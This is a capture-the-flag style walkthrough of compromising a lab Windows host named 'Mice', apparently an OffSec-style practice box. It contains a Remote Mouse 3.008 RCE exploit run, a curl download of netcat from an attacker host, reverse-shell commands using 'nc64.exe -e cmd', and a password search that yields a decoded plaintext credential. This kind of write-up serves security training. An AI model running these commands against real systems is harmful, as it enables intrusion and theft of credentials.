---
icon: windows
---

# Mice - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.231.199 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 15:56 EDT
Nmap scan report for 192.168.231.199
Host is up (0.029s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE        VERSION
1978/tcp open  remotemouse    Emote Remote Mouse
1979/tcp open  unisql-java?
1980/tcp open  pearldoc-xact?
3389/tcp open  ms-wbt-server  Microsoft Terminal Services
| ssl-cert: Subject: commonName=Remote-PC
| Not valid before: 2025-10-05T19:55:39
|_Not valid after:  2026-04-06T19:55:39
|_ssl-date: 2025-10-06T20:00:58+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: REMOTE-PC
|   NetBIOS_Domain_Name: REMOTE-PC
|   NetBIOS_Computer_Name: REMOTE-PC
|   DNS_Domain_Name: Remote-PC
|   DNS_Computer_Name: Remote-PC
|   Product_Version: 10.0.19041
|_  System_Time: 2025-10-06T20:00:29+00:00
7680/tcp open  pando-pub?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (92%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (92%), Microsoft Windows 10 1909 - 2004 (85%), Windows Server 2019 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   35.22 ms 192.168.45.1
2   30.19 ms 192.168.45.254
3   30.25 ms 192.168.251.1
4   31.29 ms 192.168.231.199
```

### <mark style="color:$primary;">HTTP Port 1978 TCP</mark>

<figure><img src="../../.gitbook/assets/image (541).png" alt=""><figcaption></figcaption></figure>

A quick search reveals a Unauthenticated RCE, I do not know the exact version running on this box. So I tried a couple of versions, but I found this git repo with a promising exploit: [**LINK**](https://github.com/p0dalirius/RemoteMouse-3.008-Exploit)

### <mark style="color:$primary;">**RemoteMouse 3.008 RCE**</mark>&#x20;

```
git clone https://github.com/p0dalirius/RemoteMouse-3.008-Exploit
```

I will use nc64.exe to get a shell on the target machine

```
python RemoteMouse-3.008-Exploit.py --target-ip 192.168.231.199 -v --cmd 'powershell -c "curl http://192.168.45.158/nc64.exe -o C:/Windows/Temp/nc64.exe"'
```

<figure><img src="../../.gitbook/assets/image (542).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (543).png" alt=""><figcaption></figcaption></figure>

I got a hit! Now, get a shell.

```
python RemoteMouse-3.008-Exploit.py --target-ip 192.168.231.199 -v --cmd 'powershell -c "C:/Windows/Temp/nc64.exe 192.168.45.158 135 -e cmd"'
```

```
python RemoteMouse-3.008-Exploit.py --target-ip 192.168.231.199 -v --cmd 'powershell -c "C:/Windows/Temp/nc64.exe 192.168.45.158 443 -e cmd"'
```

<figure><img src="../../.gitbook/assets/image (544).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (545).png" alt=""><figcaption></figcaption></figure>

Got a shell as divine!

## <mark style="color:blue;">Privilege Escalation</mark>

There is an antivirus blocking us from running any executables or scripts, so I will try searching for some passwords

### <mark style="color:$primary;">Manual Enumeration</mark>

```
findstr /SIM /C:"pass" *.ini *.cfg *.xml
```

<figure><img src="../../.gitbook/assets/image (546).png" alt=""><figcaption></figcaption></figure>

```
Q29udHJvbEZyZWFrMTE=
```

I got a base64 encoded password

<figure><img src="../../.gitbook/assets/image (547).png" alt=""><figcaption></figcaption></figure>

```
ControlFreak11
```

I'll use this to rdp as divine

```
xfreerdp3 /v:192.168.231.199 /u:divine /p:ControlFreak11 /clipboard /dynamic-resolution /cert:ignore
```

<figure><img src="../../.gitbook/assets/image (548).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Remote Mouse GUI 3.008 - Local Privesc</mark>

<figure><img src="../../.gitbook/assets/image (549).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (550).png" alt=""><figcaption></figcaption></figure>

These steps did not work for me on xfreerdp, so I switched to rdesktop

```
rdesktop -r clipboard:PRIMARYCLIPBOARD 192.168.231.199
```

<figure><img src="../../.gitbook/assets/image (551).png" alt=""><figcaption></figcaption></figure>

Since its missing from the tray let's restart windows explorer. The below are Powershell commands:

```
Stop-Process -Name explorer
Start-Process explorer
```

<figure><img src="../../.gitbook/assets/image (552).png" alt=""><figcaption></figcaption></figure>

Patience is not my virtue! But I had to wait here

<figure><img src="../../.gitbook/assets/image (553).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (554).png" alt=""><figcaption></figcaption></figure>

And we are finally admin! This box took to long
